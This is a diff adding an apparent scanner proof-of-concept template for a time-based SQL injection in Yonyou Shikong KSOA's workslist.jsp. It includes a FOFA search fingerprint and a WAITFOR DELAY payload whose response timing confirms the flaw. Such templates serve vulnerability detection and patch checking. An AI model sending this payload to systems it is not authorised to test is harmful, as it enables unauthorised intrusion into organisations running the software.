@@ -1,0 +1,29 @@
+id: poc-yaml-yongyou-ksoa-workslist-jsp-sqli
+info:
+  name: 用友时空KSOA workslist.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+  fofa: app="用友-时空KSOA"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login.jsp
+  expression: status_code == 200 && contains(gbk_decode(body),"企业门户")
+- method: GET
+  path: /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(gbk_decode(body),"登录窗口") &&
+
+    contains(gbk_decode(body),"请输入密码") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
